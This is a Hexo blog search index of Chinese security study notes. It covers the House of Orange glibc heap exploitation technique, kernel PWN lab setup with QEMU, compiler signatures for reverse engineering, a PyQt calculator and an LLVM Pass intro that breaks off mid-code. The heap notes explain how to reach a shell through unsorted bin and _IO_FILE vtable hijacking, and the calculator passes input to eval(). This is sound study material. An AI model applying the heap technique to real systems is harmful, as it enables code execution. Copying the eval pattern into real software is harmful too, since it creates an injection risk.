<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024年度总结</title>
    <url>/2025/01/26/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="78d3f35f3c3115dd9206142e175aebe0061fa9bc03fdf31b9a527e0e0c9bd40d"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">mick0960 access only!</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>House系列学习</title>
    <url>/2024/12/21/House%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1>House of Orange</h1>
<p>主要是对之前所学习的内容进行细节补充</p>
<h2 id="概述">概述</h2>
<p>House of orange是一种针对低版本堆题无free函数来进行IO流攻击的手法。其大致思路为利用unsortedbin_attack劫持_IO_list_all指针，然后劫持_IO_FILE_plus的vtable来进行getshell</p>
<h2 id="前置知识——Unsortedbin-attack">前置知识——Unsortedbin attack</h2>
<p>Unsortedbin为一个双向链表，其内的堆采用FIFO进行管理这里直接分析一下<code>__int_malloc</code>中对unsortedbin进行操作的相关源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              ...</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>在fastbin,smallbin,largebin中都无法exact fit后，就进入了这个大循环在这个大循环中，首先循环检查unsortedbin中是否有堆块如果有的话，先设置<code>bck = victim-&gt;bk</code>然后检查<code>victim</code>大小是否合法接着检查所申请的<code>nb(normalized byte)</code>：</p>
<ol>
<li class="lvl-3">是否属于smallbin的大小</li>
<li class="lvl-3">当前victim是否为unsortedbin的最后一个堆</li>
<li class="lvl-3">当前堆的大小是否大于(用户申请的内存+MINSIZE)<br>
都未通过的话，则将当前chunk从unsortedbin链表中释放操作如下:</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>
<p>正常的双向链表解链操作但是如果当unsortedbin中只有一个堆块，而该堆块的bk指针我们可以进行修改那么就可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>
<p>在任意位置写上unsorted_chunks (av)指针</p>
<h2 id="前置知识——top-chunk">前置知识——top chunk</h2>
<p>当用户申请的堆块，在各个bin中都无法满足后，则进入use top</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br></pre></td></tr></table></figure>
<p>在use top中，首先会判断当前top chunk的size是否大于用户申请的内存大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>不满足后，后面又涉及到另一个小trick</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">   here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这里会检查fastbin中是否有chunk，有的话则进行合并，然后将合并后的堆，根据其大小分到不同的bin中到最后，才会做出响应用户申请内存的请求</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>这里使用sysmalloc进行申请内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* definations */</span></span><br><span class="line">   <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">    ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在sysmalloc中，首先会检查申请的内存是否大于mmap的最小申请阈值即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)</span><br></pre></td></tr></table></figure>
<p>但对于house of orange来说，其申请的内存不会超过其值</p>
<p><img src="/images/pasted-19.png" alt="upload successful"><br>
在跳过这个检查后，开始进入几个断言检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;</span><br><span class="line">  old_size = chunksize (old_top);</span><br><span class="line">  old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line">  brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line">  <span class="comment">// old_end = (char *) (chunk_at_offset (old_top, old_size));</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>
<p>对于第一个assert:</p>
<ol>
<li class="lvl-3">
<p>判断old_top的地址是否和刚生成时一样</p>
</li>
<li class="lvl-3">
<p>old_top-&gt;size是否等于0</p>
</li>
<li class="lvl-3">
<p>old_top-&gt;size是否大于0x10</p>
</li>
<li class="lvl-3">
<p>old_top-&gt;prev_inuse是否等于1</p>
</li>
<li class="lvl-3">
<p>old_top是否为页对齐的</p>
</li>
</ol>
<h1>House of Pig</h1>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>House系列</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel PWN——内核编译以及模拟</title>
    <url>/2025/02/19/Kernel-PWN%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<h1>编译</h1>
<p>内核版本下载，这里随便选一个LTS版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.98.tar.xz</span><br></pre></td></tr></table></figure>
<p>下载完解压进入对应的目录来配置一些选项</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.4.98/</span><br><span class="line">make menuconfig <span class="comment"># Kernel hacking -&gt; Compile-time checks and compiler options -&gt; [*]Compile the kernel with debug info</span></span><br><span class="line">make -j3 bzImage</span><br></pre></td></tr></table></figure>
<p>编译好后会显示如下信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kernel: <span class="built_in">arch</span>/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure>
<p>编译便到此结束</p>
<h1>QEMU模拟</h1>
<p>这里首先需要安装busybox来模拟文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.32.1.tar.bz2</span><br></pre></td></tr></table></figure>
<p>然后进行配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line"><span class="comment"># Setttings -&gt; [*] Build static binary (no shared libs)</span></span><br><span class="line"><span class="comment"># Linux System Utilities -&gt; [] Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)</span></span><br><span class="line"><span class="comment"># Networking Utilities -&gt; [] inetd</span></span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -j3</span><br></pre></td></tr></table></figure>
<p>创建<code>_install</code>目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>
<p><font style="color:rgba(0, 0, 0, 0.87);">在 </font><code>_install</code><font style="color:rgba(0, 0, 0, 0.87);"> 目录下创建以下文件夹</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>
<p>创建<code>init</code>启动脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
<p>随后在该目录下打包文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="comment"># 打包的文件系统在上一级目录下</span></span><br></pre></td></tr></table></figure>
<h1>启动！</h1>
<p>启动脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-28.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>Kernel PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt6学习第一天——基础框架、信号与槽和第一个计算器程序</title>
    <url>/2024/08/09/PyQt6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A1%86%E6%9E%B6%E5%92%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="基础框架">基础框架</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QApplication, QWidget</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = MyWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>
<h2 id="第一个计算器程序">第一个计算器程序</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QWidget, QApplication</span><br><span class="line"><span class="keyword">from</span> Ui_Calculator <span class="keyword">import</span> Ui_Form</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">calcWindow</span>(QWidget, Ui_Form):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.setupUi(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.bind()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 批量为 btn0 到 btn9 添加点击事件</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, <span class="string">f&#x27;btn<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, b=button: <span class="variable language_">self</span>.addNumber(b.text()))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 为运算按钮添加点击事件</span></span><br><span class="line">        operators = &#123;</span><br><span class="line">            <span class="string">&#x27;btn_multiply&#x27;</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_divide&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_substract&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_plus&#x27;</span>: <span class="string">&#x27;+&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> btn_name, symbol <span class="keyword">in</span> operators.items():</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, btn_name)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, s=symbol: <span class="variable language_">self</span>.addNumber(s) <span class="keyword">if</span> <span class="variable language_">self</span>.isValid() <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.btn_equal.clicked.connect(<span class="variable language_">self</span>.calcResult)</span><br><span class="line">        <span class="variable language_">self</span>.btn_clear.clicked.connect(<span class="variable language_">self</span>.clearBox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clearBox</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.result_box.clear()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calcResult</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = <span class="built_in">str</span>(<span class="built_in">eval</span>(<span class="variable language_">self</span>.result))</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(result)</span><br><span class="line">            <span class="variable language_">self</span>.result = result</span><br><span class="line">        <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Cannot divide by zero&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.result_box.text()[-<span class="number">1</span>:].isdigit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addNumber</span>(<span class="params">self, num: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.result += num</span><br><span class="line">        <span class="variable language_">self</span>.result_box.setText(<span class="variable language_">self</span>.result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = calcWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PyQT</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse学习第一周——特征和壳</title>
    <url>/2024/08/08/Reverse%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%88%9D%E8%AF%86%E9%80%86%E5%90%91%E4%B8%8E%E5%A3%B3/</url>
    <content><![CDATA[<h1>什么是特征？</h1>
<p>每一种编程语言或者编译器所编译出来的程序都有其独特的特征，其通常表现在：<code>入口点</code>，<code>程序区段</code>，<code>加载模块</code>等。</br>下面就各种语言和编译器所编译出来的程序进行分析。</p>
<h2 id="VC6">VC6</h2>
<p>使用OllyDbg查看<img src="/images/pasted-2.png" alt="upload successful"><br>
可以看到其入口点代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br></pre></td></tr></table></figure>
<p>使用Exeinfope查看区段情况<br>
<img src="/images/pasted-3.png" alt="upload successful"></p>
<h3 id="总结">总结</h3>
<p>在入口点代码上，VC6程序使用了固定的两行代码，其调用的API也是相同的</br>在程序区段上，VC6程序的区段为固定的<code>.text</code>,<code>.rdata</code>,<code>.data</code>,<code>.rsrc</code></p>
<h2 id="VS2008-VS2013">VS2008&amp;VS2013</h2>
<p>使用OllyDbg查看<br>
2008:<br>
<img src="/images/pasted-6.png" alt="upload successful"><br>
2013:<br>
<img src="/images/pasted-5.png" alt="upload successful"><br>
其入口点代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call xxx ;调用模块相同</span><br><span class="line">jmp xxx</span><br></pre></td></tr></table></figure>
<p>使用Exeinfope查看区段情况<br>
2008:<br>
<img src="/images/pasted-7.png" alt="upload successful"><br>
2013:<br>
<img src="/images/pasted-8.png" alt="upload successful"><br>
相较于VC6多了一个<code>.reloc</code>段</p>
<h3 id="总结-2">总结</h3>
<p>VS2008&amp;VS2013的入口点代码特征为先call后jmp，区段相较vc6多一个<code>.reloc</code>段</p>
<h2 id="易语言独立-非独立-编译程序">易语言独立(非独立)编译程序</h2>
<p>使用OllyDbg查看入口点代码非独立编译：<img src="/images/pasted-10.png" alt="upload successful"><br>
第一个call作用我感觉是进入主函数（main）的意思，后面则定义了几个字符串进入到<code>0x40108E</code>后，<code>0x40109E</code>开始调用<code>krnln.fnr</code>库</p>
<blockquote>
<p>易语言程序在非独立编译后，会生成两个运行所需的依赖库分别为<code>krnln.fnr</code>和<code>krnln.fne</code></p>
</blockquote>
<p>还有个很独特的特征，就是在每次call完之后，都会返回到一个核心函数中<img src="/images/pasted-12.png" alt="upload successful"><br>
在我理解看来，这个操作和C语言中调用库函数会触发延迟绑定重定向到真正函数的操作差不多</p>
<p>使用Exeinfope查看区段情况<img src="/images/pasted-11.png" alt="upload successful"><br>
可以看到区段情况和<strong>VC6</strong>相同</p>
<h3 id="总结-3">总结</h3>
<p>从入口点代码特征上看，易语言程序先是call到主函数，后面则定义了几个字符串</br>从程序执行流程代码上看，每次调用函数，会触发重定向操作</br>从区段上看，和<strong>VC6</strong>相同</p>
<h2 id="Delphi">Delphi</h2>
]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>llvm学习（1）</title>
    <url>/2024/12/03/llvm%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<h1>LLVM Pass学习（1）</h1>
<p>因为不想再在这种题上爆零，所以开了这个系列😭</p>
<h2 id="LLVM-Pass概述">LLVM Pass概述</h2>
<p>LLVM Pass 是一个在 LLVM 编译框架中执行的独立的代码变换或优化步骤。LLVM 本身是一个开源的编译器框架，广泛用于生成机器代码、优化代码和进行程序分析。Pass 是 LLVM 中处理中间表示（IR, Intermediate Representation）的基本单位。</p>
<h3 id="具体概念解释：">具体概念解释：</h3>
<ol>
<li class="lvl-3">
<p><strong>中间表示（IR）</strong>：<br>
LLVM 使用一种称为中间表示（IR）的低级代码格式，介于源代码和机器代码之间。IR 更加抽象，不依赖于任何特定的硬件架构，便于进行优化和转换。</p>
</li>
<li class="lvl-3">
<p><strong>Pass</strong>：在 LLVM 中，Pass 是对 IR 进行某种操作的单元。每个 Pass 会执行特定的任务，如优化、分析或者代码转换。Pass 会遍历 IR，并对其进行修改或分析，生成更有效的代码。</p>
<p>Pass 可以分为两大类：</p>
<ul class="lvl-2">
<li class="lvl-5">
<p><strong>分析 Pass</strong>：这类 Pass 只对程序进行分析，不会修改代码。例如，分析程序的控制流、数据流、依赖关系等。</p>
</li>
<li class="lvl-5">
<p><strong>变换 Pass</strong>：这类 Pass 会对代码进行修改，通常用于优化。比如，消除无用代码（Dead Code Elimination）、循环展开（Loop Unrolling）等。</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>优化</strong>：<br>
LLVM Pass 的重要功能之一是优化，优化可以帮助生成运行更高效的代码。优化的类型有很多，包括：</p>
<ul class="lvl-2">
<li class="lvl-5"><strong>常量传播</strong>（Constant Propagation）：用已知的常量值替换表达式。</li>
<li class="lvl-5"><strong>循环优化</strong>：对循环进行优化，如循环合并、循环展开等。</li>
<li class="lvl-5"><strong>死代码消除</strong>（Dead Code Elimination）：删除不影响程序结果的代码。</li>
<li class="lvl-5"><strong>内联</strong>（Inlining）：将函数调用替换为函数体，以减少函数调用的开销。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>Pass 管理器</strong>：在 LLVM 中，多个 Pass 会被组合在一起，形成一个 Pass 管理器（Pass Manager）。Pass 管理器负责管理和执行所有的 Pass，并确保它们按照正确的顺序执行。Pass 可以是一个独立的步骤，也可以按需组合执行。</p>
</li>
<li class="lvl-3">
<p><strong>优化级别</strong>：<br>
LLVM 提供不同的优化级别（如 <code>-O1</code>、<code>-O2</code>、<code>-O3</code>）来控制 Pass 的应用程度。不同的级别表示不同的优化强度，高级别可能会使用更复杂的优化，但也可能会增加编译时间。</p>
</li>
</ol>
<h3 id="人话：">人话：</h3>
<p>假设有一段程序，它做了很多重复的计算。如果使用 LLVM Pass 来优化代码，Pass 可能会发现这些计算是冗余的（例如，两个相同的加法操作），然后将其优化成更简单的代码，从而加速程序的执行。</p>
<p>总结来说，LLVM Pass 是一种对代码进行优化和变换的机制，通过多个独立的 Pass 对中间表示进行操作，最终帮助生成更加高效的机器代码。</p>
<h2 id="小试牛刀">小试牛刀</h2>
<blockquote>
<p>环境为Ubuntu20.04，llvm版本为llvm-9</p>
</blockquote>
<p>首先准备一段官方资料给的测试代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/IR/Function.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/Pass.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/Support/raw_ostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/IR/LegacyPassManager.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/Transforms/IPO/PassManagerBuilder.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">//声明匿名空间，被声明的内容仅在文件内部可见</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass 